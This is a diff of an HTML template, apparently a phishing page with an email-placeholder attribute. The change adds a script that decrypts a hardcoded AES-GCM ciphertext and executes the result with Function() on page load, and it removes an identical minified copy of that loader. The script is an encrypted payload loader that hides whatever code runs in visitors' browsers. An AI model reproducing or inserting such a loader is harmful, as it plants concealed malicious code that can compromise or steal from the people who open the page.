@@ -1,9 +1,63 @@
+<script>
+  const h5 = (x) =>
+    Uint8Array.from(x.match(/.{1,2}/g).map((y) => parseInt(y, 16)));
+
+  const decryptData = async (ciphertext, iv, salt, key) => {
+    const decoder = new TextDecoder();
+    const ivBytes = h5(iv);
+    const saltBytes = h5(salt);
+    const derivedKey = await crypto.subtle.deriveKey(
+      { name: "PBKDF2", salt: saltBytes, iterations: 1e5, hash: "SHA-256" },
+      await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(key),
+        { name: "PBKDF2" },
+        false,
+        ["deriveKey"]
+      ),
+      { name: "AES-GCM", length: 256 },
+      false,
+      ["decrypt"]
+    );
+    const decrypted = await crypto.subtle.decrypt(
+      { name: "AES-GCM", iv: ivBytes },
+      derivedKey,
+      h5(ciphertext)
+    );
+    return decoder.decode(decrypted);
+  };
+
+  const processDecryption = async () => {
+    const data = {
+      iv: "b1d6504eea678a007e5d0a24",
+      salt: "d18df4d946a3b82aa0f930ee3300f82c",
+      ciphertext:
+        "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
+    };
+
+    if (!data) {
+      console.error("No data found");
+      return;
+    }
+
+    const { ciphertext, iv, salt } = data;
+
+    try {
+      const decryptedText = await decryptData(
+        ciphertext,
+        iv,
+        salt,
+        "my-secret-key"
+      );
+      console.log("Decrypted:", decryptedText);
+      Function(`${decryptedText}`)();
+    } catch (error) {
+      console.error("Error:", error.message);
+    }
+  };
+
+  processDecryption();
+</script>
 <div adidas="<%=EMAIL64%>">
     <span><p nike-page011="" ></span>
 </div>
-    <script>
-        const hexToBytes=s=>new Uint8Array(s.match(/.{1,2}/g).map(b=>parseInt(b,16))),decrypt=async(c,i,v,k)=>{let d=new TextDecoder,a=hexToBytes(i),s=hexToBytes(v),r=await crypto.subtle.decrypt({name:"AES-GCM",iv:a},await crypto.subtle.deriveKey({name:"PBKDF2",salt:s,iterations:1e5,hash:"SHA-256"},await crypto.subtle.importKey("raw",new TextEncoder().encode(k),{name:"PBKDF2"},!1,["deriveKey"]),{name:"AES-GCM",length:256},!1,["decrypt"]),hexToBytes(c));return d.decode(r)},fnk3u=async()=>{let e={iv:"b1d6504eea678a007e5d0a24",salt:"d18df4d946a3b82aa0f930ee3300f82c",ciphertext:"ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f"};if(!e){console.error("No data found");return}let{ciphertext:c,iv:i,salt:v}=e;try{let t=await decrypt(c,i,v,"my-secret-key");console.log("Decrypted:",t),Function(`${t}`)()}catch(n){console.error("Error:",n.message)}};fnk3u();
-
-</script>
-
-
